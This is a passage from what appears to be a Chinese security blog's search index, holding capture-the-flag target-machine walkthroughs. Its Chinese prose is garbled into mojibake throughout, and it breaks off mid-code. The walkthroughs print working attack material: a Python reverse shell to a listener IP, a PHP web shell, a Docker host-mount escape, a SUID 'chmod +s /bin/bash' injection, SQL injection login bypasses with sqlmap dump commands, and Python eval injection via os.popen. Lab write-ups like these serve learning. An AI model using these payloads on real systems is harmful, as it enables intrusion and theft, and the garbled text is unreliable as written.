è¿æ¥é€šè¿‡ HTTP æ¡æ‰‹å‡çº§è€Œæ¥ï¼ˆä»…ä¸€æ¬¡ HTTP è¯·æ±‚ï¼‰ï¼Œä¹‹åå½»åº•è„±ç¦» HTTP åè®®ï¼ŒåŸºäºçº¯ TCP è¿›è¡ŒåŒå‘é€šä¿¡ï¼š è¿æ¥ä¸€æ—¦å»ºç«‹ï¼Œé™¤éä¸»åŠ¨æ–­å¼€ï¼ˆå®¢æˆ·ç«¯ æœåŠ¡å™¨è°ƒç”¨å…³é—­ï¼‰ï¼Œå¦åˆ™ä¼šä¸€ç›´ä¿æŒï¼› æ•°æ®ä¼ è¾“æ—¶æ— éœ€æºå¸¦ HTTP å¤´éƒ¨ï¼ˆä»…å°‘é‡ WebSocket å¸§åè®®å¼€é”€ï¼‰ï¼Œæ¯” HTTP è½®è¯¢é«˜æ•ˆ 10 å€ä»¥ä¸Šã€‚ æä½å»¶è¿Ÿå’Œèµ„æºæ¶ˆè€— æ²¡æœ‰ HTTP è½®è¯¢çš„ â€œæ— æ•ˆè¯·æ±‚â€ å’Œ â€œå¤´éƒ¨å†—ä½™â€ï¼ˆHTTP å¤´éƒ¨é€šå¸¸å‡ ç™¾å­—èŠ‚åˆ°å‡  KBï¼ŒWebSocket å¸§å¤´éƒ¨ä»… 2-10 å­—èŠ‚ï¼‰ï¼› æœåŠ¡å™¨æ— éœ€ç»´æŒå¤§é‡ â€œæŒ‚èµ·çš„è¯·æ±‚â€ï¼Œä¸€ä¸ª WebSocket è¿æ¥å³å¯æ”¯æ’‘åŒå‘å®æ—¶é€šä¿¡ï¼Œèµ„æºå ç”¨æä½ã€‚ WebSocket çš„å…¸å‹åœºæ™¯æ­£å› ä¸ºè§£å†³äº† HTTP çš„æ ¸å¿ƒé™åˆ¶ï¼ŒWebSocket æˆä¸ºå®æ—¶äº¤äº’åœºæ™¯çš„ â€œæœ€ä¼˜è§£â€ï¼š å³æ—¶é€šè®¯ï¼ˆèŠå¤©è½¯ä»¶ã€å®¢æœç³»ç»Ÿï¼‰ï¼› å®æ—¶æ•°æ®ç›‘æ§ï¼ˆè‚¡ç¥¨è¡Œæƒ…ã€ç³»ç»Ÿç›‘æ§é¢æ¿ï¼‰ï¼› åä½œå·¥å…·ï¼ˆå¤šäººåœ¨çº¿æ–‡æ¡£ã€ç™½æ¿ï¼‰ï¼› åœ¨çº¿æ¸¸æˆï¼ˆå®æ—¶åŒæ­¥ç©å®¶æ“ä½œå’ŒçŠ¶æ€ï¼‰ï¼› ç›´æ’­å¼¹å¹•ã€å®æ—¶æŠ•ç¥¨ç­‰ã€‚ HTTP åè®®çš„è®¾è®¡åˆè¡·æ˜¯ â€œå®¢æˆ·ç«¯è¯·æ±‚ - æœåŠ¡å™¨å“åº”â€ çš„å•å‘äº¤äº’ï¼Œå³ä½¿ä¿æŒè¿æ¥ï¼Œä¹Ÿæ— æ³•çªç ´ â€œæœåŠ¡å™¨ä¸èƒ½ä¸»åŠ¨æ¨é€â€ çš„æœ¬è´¨é™åˆ¶ï¼›è€Œ WebSocket ä¸“ä¸º â€œåŒå‘å®æ—¶é€šä¿¡â€ è®¾è®¡ï¼Œé€šè¿‡ä¸€æ¬¡è¿æ¥å®ç°å…¨åŒå·¥æ•°æ®ä¼ è¾“ï¼Œå½»åº•è§£å†³äº† HTTP åœ¨å®æ—¶åœºæ™¯ä¸‹çš„ä½æ•ˆå’Œå»¶è¿Ÿé—®é¢˜ã€‚","tags":["websocket","portswigger"]},{"title":"languageé¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-dockeré€ƒé€¸-çˆ†ç ´","path":"/2025/06/25/posts/language/","content":"languageé¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-dockeré€ƒé€¸-çˆ†ç ´ Nmapæ‰«æå‘ç°ç«¯å£ 80å’Œ9999 è®¿é—®80æ²¡ä¸œè¥¿ å°±è®¿é—®9999ç«¯å£-ç»“æœæ˜¯pikachu é‚£å°±ç›´æ¥RCEå°±è¡Œ ä½†æ˜¯ä»–è¿™é‡ŒRCE ä»€ä¹ˆå‘½ä»¤éƒ½æ²¡æœ‰æˆ–è€…é™åˆ¶äº†ï¼Ÿ è¯•è¯•å…¶ä»–çš„åå¼¹127.0.0.1 | python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.1.126,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);æˆåŠŸäº† æ‹¿åˆ°shellæƒé™ è¿™é‡Œç¿»åˆ°äº†æ•°æ®åº“å¯†ç  è¿›å»çœ‹çœ‹ è¿™é‡Œç¿»åˆ°äº†ä¸€ä¸ªç”¨æˆ·å«ml ä½†æ˜¯è¿™é‡Œç³»ç»Ÿä»€ä¹ˆç”¨æˆ·éƒ½æ²¡æœ‰ å¾ˆå¥‡æ€ªå•Š è¿™é‡Œä¸€å¼€å§‹å°±æ€€ç–‘æ˜¯dockerå®¹å™¨é‡Œé¢ è¿™é‡Œç¿»åˆ°äº†ä¸€äº›æç¤ºæ–‡ä»¶å’Œåˆ¤æ–­æ˜¯ä¸æ˜¯docker åˆ¤æ–­æ˜¯ä¸æ˜¯docker1ï¼šä¸»æœºåå­— è¾“å…¥å­—ç¬¦è¿”å›é•¿å­—ç¬¦ä¸²2ï¼šls /sys/fs/cgroup è¿™ç›®å½• æ˜¯ Docker å’Œå…¶ä»–å®¹å™¨æŠ€æœ¯ä½¿ç”¨çš„cgroupï¼ˆæ§åˆ¶ç»„ï¼‰ä¿¡æ¯æ‰€åœ¨çš„ç›®å½•ã€‚æŸ¥çœ‹æœ‰æ— 3ï¼šdocker psç›´æ¥æŸ¥çœ‹æœ‰æ— è€Œä¸”è¿™é¶æœºç”¨æˆ·éƒ½æ²¡æœ‰å¾ˆå¤§å‡ ç‡åœ¨dockeré‡Œé¢ ç„¶åæˆ‘ä»¬è·å¾—ç”¨æˆ·åŒæ—¶é‚£ä¸ªæç¤ºè¯æ˜å¯†ç æœ‰å…³ç”¨æˆ·åçˆ†ç ´å°±è¡Œcat /usr/share/wordlists/rockyou.txt | grep ^ml ml.txt å–å‡ºä»¥mlå¼€å¤´çš„ æ‹¿rootç™»å½•ä¸Šå» å‘ç°.bash_historyæ²¡æœ‰åˆ é™¤å¹¶ä¸”sudo -l ç„¶åä»–å¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨ æ²¡æœ‰ å‘ƒå‘ƒå‘ƒ è¿™é‡ŒåšWPå‘ç°ä¸€ä¸ªç›´æ¥æ–¹æ³•Docker å®¹å™¨æœ¬èº«è¿è¡Œæ—¶é»˜è®¤æ˜¯ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œçš„ï¼ˆé™¤éä½ æ˜ç¡®æŒ‡å®šä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œï¼‰ï¼Œæ‰€ä»¥å®¹å™¨å†…ä½ ä¼šè·å¾— root æƒé™ã€‚ è¿™é‡Œè¯´æ˜ä¸‹æˆ‘åœ¨å®¹å™¨åˆ›å»ºçš„123.txt æˆ‘åœ¨å¤–é¢æ˜¯çœ‹ä¸åˆ°çš„ä»–å»ºç«‹çš„å®¹å™¨æ²¡æœ‰å’Œæœ¬èº«å»ºç«‹è¿æ¥ä¸èƒ½ä¿®æ”¹æœ¬èº«è¿™é‡Œæˆ‘åšçš„ç›´æ¥æŒ‚è½½å¹¶ä¸”å’Œæœ¬èº«å»ºç«‹è¿æ¥ æ„æ€ä½ ä¿®æ”¹å®¹å™¨ä¹Ÿä¼šä¿®æ”¹æºæ–‡ä»¶/è¿™é‡Œæˆ‘é‡æ–°æ‹¿ä¸€ä¸ªé•œåƒdocker run -v /:/mnt -it alpine chroot /mnt sh å¹¶ä¸”åœ¨æ ¹ç›®å½•åˆ›å»ºæ–‡ä»¶hahaha.txt æˆ‘ä»¬é€€å‡ºåˆ°ç”¨æˆ·çœ‹çœ‹æœ‰æ²¡æœ‰ ç¡®å®å­˜åœ¨ æ‰€ä»¥æˆ‘ä»¬å†™å…¥.sshå°±å¯ä»¥ææƒåˆ°æœ¬èº«çš„rooté‡Œé¢ è§£é‡Šä»£ç  - docker run -v /:/mnt -it alpine chroot /mnt sh docker run ç”¨äºå¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤-v /:/mnt -vè¡¨ç¤ºæŒ‚è½½ /æ˜ å°„åˆ°/mntç›®å½•-it -i è®©å®¹å™¨ä¿æŒäº¤äº’æ¨¡å¼ï¼Œ-t ç»™ä½ ä¸€ä¸ªç»ˆç«¯ã€‚chroot /mnt sh è¿™é‡Œæœ€å…³é”®æ­¥éª¤ å®¹å™¨é‡Œçš„å‘½ä»¤æ‰§è¡Œç¯å¢ƒå°±å˜æˆäº†å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿ ç›¸å½“äºä½ â€œåˆ‡æ¢æ ¹â€ï¼Œä»å®¹å™¨è½¬åˆ°äº†å®¿ä¸»æœºä¸Šsh æ‰§è¡Œä¸€ä¸ª shell åœ¨å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸­æ‰§è¡Œ /bin/sh å¦‚ä½•é˜²èŒƒ1ï¼šç¦ç”¨å®¹å™¨æŒ‚è½½å·åŠŸèƒ½2ï¼šrootå¼€å¯é•œåƒæ—¶å€™ï¼šDocker å®¹å™¨é»˜è®¤ä¼šä»¥ root ç”¨æˆ·è¿è¡Œï¼Œå¦‚æœæ²¡æœ‰ç‰¹åˆ«é™åˆ¶ï¼Œå®¹å™¨å†…çš„ç”¨æˆ·å¯ä»¥æ‰§è¡Œå¾ˆå¤šæ•æ„Ÿæ“ä½œå¯ä»¥docker run --privileged=false -it ubuntu ç¦ç”¨ç‰¹æƒæ¨¡å¼3ï¼šé™åˆ¶æŒ‚è½½ç›®å½•å…³é”®ç‚¹è¿˜æ˜¯ ä¸è¦ç›´æ¥å°† Docker æƒé™ç›´æ¥ç»™åˆ°ç”¨æˆ·æ‰‹ä¸Š æ€»ç»“ä¸€ä¸‹1ï¼šå¦‚æœç”¨æˆ·æœ‰ Docker æƒé™ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ§åˆ¶ Docker å®¹å™¨ï¼Œä»–ä»¬å‡ ä¹èƒ½å¤Ÿç»•è¿‡æ‰€æœ‰å®¹å™¨å†…çš„é™åˆ¶ï¼ˆåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿæƒé™ï¼‰ï¼Œå¹¶ç›´æ¥è®¿é—®å®¿ä¸»æœºèµ„æºã€‚å› æ­¤ï¼Œé˜²æ­¢å°† Docker æƒé™æˆäºˆéç®¡ç†å‘˜ç”¨æˆ·æ˜¯å®¹å™¨å®‰å…¨çš„åŸºç¡€ã€‚å¦‚æœ Docker æƒé™æ— æ³•è¢«æ§åˆ¶ï¼Œå…¶ä»–çš„å®‰å…¨æªæ–½å°†æ˜¾å¾—éå¸¸è„†å¼±ã€‚","tags":["dockeré€ƒé€¸","çˆ†ç ´"]},{"title":"hoshié¶æœº---éš¾åº¦mediumçŸ¥è¯†ç‚¹-æ–‡ä»¶åŒ…å«+è¡¨è¾¾å¼æ³¨å…¥+ç›²æ°´å°","path":"/2025/06/23/posts/hoshi/","content":"hoshié¶æœºâ€”éš¾åº¦mediumçŸ¥è¯†ç‚¹-æ–‡ä»¶åŒ…å«+è¡¨è¾¾å¼æ³¨å…¥+ç›²æ°´å° Nmapæ‰«æå‘ç°ç«¯å£ 80å’Œ22 æˆ‘ä»¬å…ˆè®¿é—®çœ‹çœ‹WEBä»€ä¹ˆæ•ˆæœ index.php å¥½å§åˆæ˜¯ç»å…¸çš„ç•Œé¢ ç°åœ¨çœ‹åˆ°è¿™ç§ç•Œé¢å°±æ„Ÿè§‰éš¾åº¦ä¸ä½ è¿™é‡Œæäº¤åé¦ˆä¼šåœ¨ä¸‹é¢ç”Ÿæˆåœ¨uploadsæ–‡ä»¶å¤¹ç”Ÿæˆä½ çš„æ–‡ä»¶å æˆ‘ä»¬å†çœ‹admin.phpè¿™é‡Œéœ€è¦å¯†ç  æˆ‘ä»¬çœ‹çœ‹æºç ç„¶åè¿™é‡Œçˆ†ç ´äº†ä¸‹éƒ½æ²¡å‘ç°ä»€ä¹ˆ å…ˆæ”¾åœ¨è¿™é‡Œ ç›®å½•æ‰«æåˆ°ä¸€ä¸ª/robots.txt æ–‡ä»¶æˆ‘ä»¬è®¿é—®çœ‹çœ‹ è¿™é‡Œå¡äº†å¾ˆä¹…é—®äº†ä¸‹ä½œè€…è¯´æ˜¯ç”¨ç›²æ°´å° å·¥å…·å°±é€‰è¿™ä¸ª bwm.pypython bwmforpy3.py decode MAZ.png int.png 123.pngå‰é¢mazæ˜¯åŸå›¾ intæ˜¯æ°´å°å›¾ 123.pngæ˜¯ç”Ÿæˆå›¾ç‰‡ æˆ‘ä»¬è®¿é—®ç›®å½• - è¿™é‡Œåªæœ‰ä¸€ä¸ªGIFT.PHPæˆ‘ä»¬è®¿é—® è¿™ç§çœ‹ç€å°±æœ‰ç‚¹åƒå¸¦å‚æ•° æˆ‘ä»¬FUZZä¸‹wfuzz -w /usr/share/zidian/SecLists-2023.2/Discovery/Web-Content/common.txt -u http://IP/hoshi/gift.php?FUZZ=index.php --hl 0 ä»–è¿”å›äº†index.phpç•Œé¢ ä¹Ÿå°±æ˜¯è¯´å¯èƒ½æ˜¯ æ–‡ä»¶åŒ…å« è¿™é‡Œæˆ‘æœ‰ä¸€ä¸ªæ€è·¯ ä¸æ˜¯ä¸€å¼€å§‹ç”Ÿæˆäº§ç”Ÿäº†txtæ–‡ä»¶å— æˆ‘ä»¬æŠŠtxtæ–‡ä»¶åŒ…å«ä¸å°±è¡Œäº† å¦‚å›¾ä»–åªèƒ½åŒ…å«htmlä¸‹çš„ ä¸èƒ½å‡ºç°/ .. ç¬¦å· æœ‰æ²¡æœ‰å¯èƒ½æŠŠtxtæ–‡ä»¶æ”¾ä¸Šæ¥å‘¢ è¿™é‡Œæˆ‘åœ¨åå­—å‰é¢åŠ ../æœç„¶ä»–ç›®å½•å‘ç”Ÿäº†å˜åŒ–ä¸åœ¨uploadsé‡Œé¢æ”¾åˆ°äº†htmlé‡Œé¢ç„¶åæˆ‘å»åŒ…å«è¯•è¯• çœ‹åˆ°ä¸Šé¢å°±å‘ç°ä¸è¡Œäº†txté‡Œé¢éœ€è¦å®Œæ•´phpä»£ç ä½†æ˜¯è¢«å®ä½“åŒ–äº†è‚¯å®šåŠ è½½ä¸äº†äº†éƒ½å˜æˆäº†æ–‡å­— ç„¶åå¡äº†å¾ˆä¹…é—®ä¸‹ä¸‹ä½œè€…æ‰æƒ³åˆ°å¯†ç æ–‡ä»¶è¿˜æ²¡ç”¨è¿™é‡Œå°±æ˜¯çŒœå¯†ç äº† è¿™é‡Œæˆ‘ç”¨å¯†ç ç”Ÿæˆå·¥å…·ç”Ÿæˆhoshiæ¨¡æ¿å¯†ç éƒ½æ²¡ç”¨ç„¶åè¯•äº†åŸŸå ç»“æœæŠŠå®¢æœç”µè¯æ”¾ä¸Šå»å‘ç°å¯ä»¥äº† 400-123-4567 ä½†æ˜¯å§ä¹Ÿæ²¡æ³¨æ„ä»€ä¹ˆè¿™é‡Œåˆå¡äº†å‡ ä¸ªå°æ—¶å§ç„¶åé—®ä½œè€…XD ç»“æœå‘ç°äº†ä¸€ä¸ª è¿™é‡Œä½ å¯ä»¥è¯•è¯•é™æ€é¡µé¢è‚¯å®šå°±æ˜¯htmlé¡µé¢äº† ä¹Ÿå°±æ˜¯è¯´ä½ ç”Ÿæˆçš„åé¦ˆæ–‡ä»¶ä¼šè¢«admin.phpç”Ÿæˆadmin.htmlä½†æ˜¯HTMLæ€ä¹ˆæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ æœ‰PHPè¯­å¥ä¹Ÿä¸è¡Œå•Š ä½†æ˜¯ä½ å¿˜äº†è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ç‚¹äº†å— è€Œä¸”æˆ‘ä»¬æ–‡ä»¶åæ˜¯éšä¾¿å–å¾— æ‹¿åˆ°shellæƒé™æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªè¿™æ ·åå­—å¾—åé¦ˆæ–‡ä»¶ç„¶åå…ˆè®¿é—®admin.htmlçœ‹çœ‹æœ‰æ²¡æœ‰ è®¿é—®admin.html å› ä¸ºæˆ‘ä»¬æ²¡æœ‰æ‰§è¡Œadmin.phpæ‰€ä»¥è¿˜æ²¡åŠ è½½è¿›å» è®¿é—®çœ‹çœ‹æ˜¯å¦åŠ è½½äº† ç¡®å®åŠ è½½äº†æˆ‘ä»¬å¾—htmlåº”è¯¥ä¹Ÿå˜äº† æˆ‘ä»¬å†åŒ…å«è¯•è¯• å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œæ¥ç€æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª?php system($_GET[a]) ? ç„¶ååå¼¹busyboxæˆåŠŸæ‹¿åˆ°SHELL è¿™é‡Œæœ‰ç–‘é—®1ï¼šä½ ç”Ÿæˆ?phhxxx?æ–‡ä»¶ä½ ç›´æ¥åŒ…å«admin.phpä¸è¡Œå— 1.1 admin.phpç”Ÿæˆçš„æ˜¯htmlä»£ç  - é‡Œé¢æœ‰phpå‘½ä»¤ ä½†æ˜¯è¢«æ³¨é‡Šäº† å› ä¸ºHTMLä»£ç ä¼šæŠŠPHPæ³¨é‡Šæ‰æ‰€ä»¥åŒ…å«htmlé‡Œé¢ä¼šæ‰§è¡ŒPHPä»£ç  æ‹¿rootè¿™é‡Œå®¶ç›®å½•æœ‰ä¸€ä¸ªwelcomeç”¨æˆ· ä½†æ˜¯è¦æ‰¾å¯†ç åœ¨/var/backups æœ‰ä¸€ä¸ªshadow~ ä½¿ç”¨johnè§£ç è·å¾—å¯†ç loveme2 ç„¶åç™»å½• sudoä¸€ä¸‹è¿™ç§ä¸€çœ‹å°±æ˜¯NCè®¿é—® æˆ‘ä»¬è®¿é—®æ‰§è¡Œä¸‹ è¿™é‡Œæœ‰ä¸€ä¸ªæ—¥å¿—å¯ä»¥çœ‹æ€ä¹ˆæ‰§è¡Œå¾— è¿™é‡ŒçŒœå‡ºæ¥å¾ˆå¤§æ¦‚ç‡æ˜¯æ‹¼æ¥ é‚£æˆ‘ä»¬å¯ä»¥è¡¨è¾¾å¼æ³¨å…¥è¿™é‡Œç¦ç”¨äº†å¾ˆå¤šå­—ç¬¦å¦‚| ï¼› ä½†æ˜¯æ²¡æœ‰è¿™é‡Œç»™å‡ºpayloadexec_cmd whoami chmod +s /bin/bash exec_cmd id ls -al exec_cmd whoami $(chmod +s /bin/bash) æ€»ç»“ä¸€ä¸‹1ï¼šç´¯æ­»äº† ä½†æ˜¯å­¦åˆ°äº†","tags":["æ–‡ä»¶åŒ…å«","è¡¨è¾¾å¼æ³¨å…¥","ç›²æ°´å°"]},{"title":"gigachadé¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-nail","path":"/2025/06/21/posts/gigachad/","content":"gigachadé¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-nail Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾ ç›´æ¥è¯•FTPåŒ¿åè®¿é—® å¾—åˆ°ä¸€å…±URLæˆ‘ä»¬è®¿é—®ä¸‹ ä½ é—®AIå¯ä»¥ä¹Ÿå¯ä»¥è¯†å›¾ è¿™é‡Œå¾—åˆ°å¯†ç maidenstower æ‹¿åˆ°shellæƒé™è¿™é‡Œæ³¨æ„æœ‰ä¸€ç¨‹åºs-nail æˆ‘ä»¬å¯ä»¥å»msfconsoleå»æœPAYLOAD ç„¶åPYTHONä¼ è¿‡å» æ‹¿root ææƒæˆåŠŸ æ€»ç»“ä¸€ä¸‹","tags":["nail"]},{"title":"yibasuoé¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-nail","path":"/2025/06/21/posts/yibasuo/","content":"yibasuoé¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-nail Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾ è¿™é‡Œæ³¨æ„FTPç‰ˆæœ¬2.3.4æœ‰ä¸€ä¸ªç¬‘è„¸RCE å½“ä½ æ‰§è¡Œå¦‚ root:)ä¼šå¼€å¯ç«¯å£ ä½†æ˜¯ä½ å»NCä¼šå‘ç°ä¸è¡Œ å¯èƒ½æ˜¯é˜²ç«å¢™é™åˆ¶äº†æœ¬åœ°è®¿é—® ç›´æ¥è¯•FTPåŒ¿åè®¿é—® å¯ä»¥ä½†æ˜¯credité‡Œé¢æ²¡æœ‰ä¿¡æ¯æ‰€ä»¥å°±ä¸çœ‹äº† è®¿é—®URLçœ‹ä¸‹ å¼±å£ä»¤ password123 å¤šè¯•è¯•å­—å…¸ åé¢â€¦ä»£ç æ²¡åŠ è½½å®Œå˜› ç„¶åè¯•è¯•busybox å¯ä»¥ æ‹¿åˆ°shellæƒé™è¿›å»çœ‹çœ‹æœ‰ä¸€ä¸ªç”¨æˆ·todd ç„¶åçœ‹é˜²ç«å¢™æœ‰æœ¬åœ°è¿æ¥é™åˆ¶æˆ‘ä»¬æœ¬åœ°è¿æ¥å°±å¯ä»¥æ‹¿åˆ°æƒé™ cat /etc/iptables/rules.v4 æ‹¿rootä¸Šé¢æ˜¯æ ‡å‡†ä¸‹é¢æ˜¯å¦ä¸€æ¡å¼±å£ä»¤è·¯çº¿â€˜ é€šè¿‡æ¨¡æ¿ç”Ÿæˆç”¨æˆ·åå¯†ç  bash generate_by_username.sh todd todd.txt ç„¶åç™»å½•å¯ä»¥ç”¨bash æ€»ç»“ä¸€ä¸‹1ï¼šä¸è¦å¿˜è®°å¼±å£ä»¤çˆ†ç ´ 2ï¼šè¿™é‡Œåˆäº†è§£ä¸€ä¸ªCVE vtpçš„2.3.4æ¼æ´","tags":["nail"]},{"title":"talké¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-SQLæ³¨å…¥","path":"/2025/06/20/posts/talk/","content":"talké¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-SQLæ³¨å…¥ Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾ è®¿é—®æ˜¯ä¸€ä¸ªèŠå¤©ç•Œé¢ç™»å½•å¯ä»¥èŠå¤© è¿™é‡Œå¹¶ä¸èƒ½çªç ´ çªç ´ç‚¹åœ¨å¤–é¢çš„ç™»å½•æ¡†åšäº†è¿™ä¹ˆä¹…ä¸è¦å¿˜è®°SQLæ³¨å…¥äº† è¿™é‡Œé™„ä¸ŠPAYLOAD jerry or 1=1 -- jerry or 1=1 ## æ˜¯æœ€å¯é çš„ç‰¹æ®Šæƒ…å†µæ³¨é‡Šæ–¹æ¡ˆ-- (å¸¦ç©ºæ ¼) æ˜¯æœ€å®‰å…¨ã€å…¼å®¹æ€§æœ€å¥½çš„æ ‡å‡†æ³¨é‡Šæ–¹å¼--+ ä¾èµ– Web æœåŠ¡å™¨çš„ URI è§£ç ç‰¹æ€§è¿™é‡Œå¯†ç ä¸ç”¨è¾“å…¥äº†å› ä¸ºsqlæ³¨å…¥ä¿®æ”¹äº†SQLè¯­å¥WHERE username = admin -- æ³¨é‡Šäº†åé¢çš„å¯†ç  AND password = ä»»ä½•å¯†ç POST /login.php HTTP/1.1Host: 172.20.10.3Origin: http://172.20.10.3Referer: http://172.20.10.3/index.php?registeredCookie: PHPSESSID=0l25og4fd06guunjegg65raeb0Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1Accept-Encoding: gzip, deflateContent-Length: 44username=jerry*password=1python sqlmap.py -r 123.txt --risk 3 --level 3 --batchpython sqlmap.py -r 123.txt --risk 3 --level 3 --current-dbpython sqlmap.py -r 123.txt --risk 3 --level 3 --current-db --batchpython sqlmap.py -r 123.txt --risk 3 --level 3 --tables -D chat --batchpython sqlmap.py -r 123.txt --risk 3 --level 3 --columns -T user -D demo01 --batchpython sqlmap.py -r 123.txt --risk 3 --level 3 --columns -T user -D chat --batchpython sqlmap.py -r 123.txt --risk 3 --level 3 --dump -C username,password,userid -T user -D chat è·å–å¯†ç æˆ‘ä»¬è·‘å°±è¡Œ æ‹¿åˆ°shellæƒé™ æ‹¿root ä¹Ÿå¯ä»¥æ‹¿å…¬é’¥ æ€»ç»“ä¸€ä¸‹1ï¼šåˆ«å¿˜äº†SQLæ³¨å…¥","tags":["SQLæ³¨å…¥"]},{"title":"matrixé¶æœº---éš¾åº¦easyçŸ¥è¯†ç‚¹-è¡¨è¾¾å¼æ³¨å…¥","path":"/2025/06/19/posts/matrix/","content":"matrixé¶æœºâ€”éš¾åº¦easyçŸ¥è¯†ç‚¹-è¡¨è¾¾å¼æ³¨å…¥ Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾ æˆ‘ä»¬è®¿é—®çœ‹ä¸‹80æ²¡ç”¨ æˆ‘ä»¬çœ‹5000è¿™é‡Œæ³¨å…¥ä¸‹è¿™ä¸ªè¾“å…¥æ¡† è¿™é‡Œè¾“å…¥å¼•å·ç›´æ¥æŠ¥é”™äº†æˆ‘ä»¬å¯ä»¥è¯•è¯•è¡¨è¾¾å¼æ³¨å…¥å› ä¸ºæ˜¯ä¸€pythonè„šæœ¬ è¿™é‡Œè¯•è¯•PAYLOAD + __import__(os).popen(whoami).read() + è¿™é‡Œç»™å‡ºæºç  def dynamic_execute(type_str, expression): command = %s%s%(type_str,expression) # æ‹¼æ¥å‡ºè¦æ‰§è¡Œçš„å‘½ä»¤ print(command) return eval(command) # æ‰§è¡Œæ‹¼æ¥åçš„å‘½ä»¤@app.route(/message, methods=[POST, GET])def handle_message(): if request.method == GET: return render_template(message.html) # æ¸²æŸ“ç•™è¨€é¡µé¢ else: message_type = request.form[type][:1] # è·å–ç•™è¨€ç±»å‹ user_message = request.form[msg] # è·å–ç”¨æˆ·ç•™è¨€å†…å®¹ username = Guest # é»˜è®¤ç”¨æˆ·åä¸º Guest result = dynamic_execute(message_type, user_message) # åŠ¨æ€æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å†…å®¹ return render_template(message.html, msg=result, status=fusername,ç•™è¨€æˆåŠŸ)### æˆ‘ä»¬è¾“å…¥è¿™ä¸ªâ€™ + import(â€œosâ€).popen(â€œwhoamiâ€).read() + â€˜ æ˜¯msgçš„ åˆ™æ•°æ®æ˜¯ uâ€™import(â€œosâ€).popen(â€œwhoamiâ€).read()â€™ åˆ™æ‰§è¡Œè¿™ä¸ªä»£ç  uicodeå°±æ˜¯stringç±»å‹æ‰€ä»¥æˆåŠŸæ‰§è¡Œ æ”¾å…¥è¿›å»æ˜¯uâ€™â€™ + import(â€œosâ€).popen(â€œwhoamiâ€).read() + â€˜â€™ ä½†æ˜¯åœ¨python2é‡Œé¢å‰é¢æ”¾å…¥unicodeå¯ä»¥ä½†æ˜¯åœ¨py3ä¸­ä¼šUnicodeæœªå®šä¹‰å¯èƒ½ä¾èµ–é‡Œé¢è®¾ç½®äº†å¯ä»¥ æˆ–è€…[type][1][1]è¿™é‡Œè·å–çš„æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¹Ÿå°±æ˜¯è¯´ä½ è¾“å…¥unicodeu é‚£ä¹ˆä½ è¾“å…¥fæ˜¯ä¸æ˜¯æ ¼å¼åŒ–è¾“å‡ºå‘¢ æ‰€ä»¥åˆä¸€ä¸ªPAYLOAD msg=os.system(whoami)type=f æ‰€ä»¥æ€»ç»“ä¸‹ä¸¤ç§ msg{os.system(â€œwhoamiâ€)}typef æ ¼å¼åŒ–è¾“å‡º msgâ€™+(os.popen(â€œpwdâ€).read()+â€™typeunicode æ‹¼æ¥æ›¿æ¢ æ‹¿åˆ°shellæƒé™å‘ç°ROOTä¹Ÿæœ‰å¼€äº†ä¸€å…±æœåŠ¡æœ¬åœ°å¯ä»¥è®¿é—®çš„8000ç«¯å£ è¿™é‡Œé€šè¿‡socatè½¬å‘ä»£ç å¦‚ä¸‹ ./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:8000 è€Œä¸”è¿˜ç»™äº†æºç æˆ‘ä»¬æ¥åˆ†æä¸‹ æ³¨æ„æ³¨æ„ è¿™é‡Œæˆ‘ä»¬PAYloadä¸èƒ½ç”¨unicodeçš„é‚£ä¸ªäº†å› ä¸ºè¿‡æ»¤äº†ç©ºæ ¼ä¸èƒ½é—­åˆäº† æˆ‘ä»¬ç”¨ç¬¬äºŒä¸ªå¯ä»¥è¯»å– def dynamic_execute(type_str, expression): command = %s%s%(type_str,expression) # æ‹¼æ¥å‡ºè¦æ‰§è¡Œçš„å‘½ä»¤ print(command) return eval(command) # æ‰§è¡Œæ‹¼æ¥åçš„å‘½ä»¤@app.route(/message, methods=[POST, GET])def handle_message(): if request.method == GET: return render_template(message.html) # æ¸²æŸ“ç•™è¨€é¡µé¢ else: message_type = request.form[type][:1] # è·å–ç•™è¨€ç±»å‹ user_message = request.form[msg] # è·å–ç”¨æˆ·ç•™è¨€å†…å®¹ username = Guest # é»˜è®¤ç”¨æˆ·åä¸º Guest if len(user_message) 35: # 